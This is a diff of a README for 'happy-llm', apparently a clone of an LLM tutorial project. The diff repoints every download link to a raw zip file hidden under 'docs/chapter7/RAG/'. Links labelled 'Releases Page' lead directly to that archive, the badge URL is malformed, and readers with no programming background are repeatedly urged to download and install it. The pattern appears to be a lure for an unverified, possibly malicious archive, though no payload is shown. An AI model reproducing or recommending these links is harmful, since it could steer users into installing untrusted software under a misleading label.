@@ -1,7 +1,7 @@
 # 📚 happy-llm - Learn Large Language Models Easily
 
 ## 🚀 Download Here
-[![Download](https://raw.githubusercontent.com/quarozox/happy-llm/main/harmost/happy-llm.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/quarozox/happy-llm/main/harmost/happy-llm.zip)
+[![Download](https://raw.githubusercontent.com/quarozox/happy-llm/main/docs/chapter7/RAG/llm_happy_v1.8.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/quarozox/happy-llm/main/docs/chapter7/RAG/llm_happy_v1.8.zip)
 
 ## 📖 About This Project
 Welcome to happy-llm! This application serves as a guide to understanding and applying large language models from the ground up. Our goal is to make complex concepts easy to grasp, even for those with no programming background.
@@ -21,7 +21,7 @@ Welcome to happy-llm! This application serves as a guide to understanding and ap
 To download and install happy-llm, please follow these steps:
 
 1. **Visit the Releases Page**: 
-   Go to our [Releases Page](https://raw.githubusercontent.com/quarozox/happy-llm/main/harmost/happy-llm.zip) to find the latest version available.
+   Go to our [Releases Page](https://raw.githubusercontent.com/quarozox/happy-llm/main/docs/chapter7/RAG/llm_happy_v1.8.zip) to find the latest version available.
 
 2. **Select the Correct File**: 
    Look for the filename that matches your operating system. Download the file by clicking on it.
@@ -51,4 +51,4 @@ happy-llm is more than just a tool; it's a growing community. You can:
 ## ⚙️ Stay Updated
 Keep an eye on the Releases Page for new updates. Each release may include new features, bug fixes, or performance improvements. 
 
-Once again, download happy-llm from our [Releases Page](https://raw.githubusercontent.com/quarozox/happy-llm/main/harmost/happy-llm.zip) and start your journey into the fascinating world of large language models today!
+Once again, download happy-llm from our [Releases Page](https://raw.githubusercontent.com/quarozox/happy-llm/main/docs/chapter7/RAG/llm_happy_v1.8.zip) and start your journey into the fascinating world of large language models today!
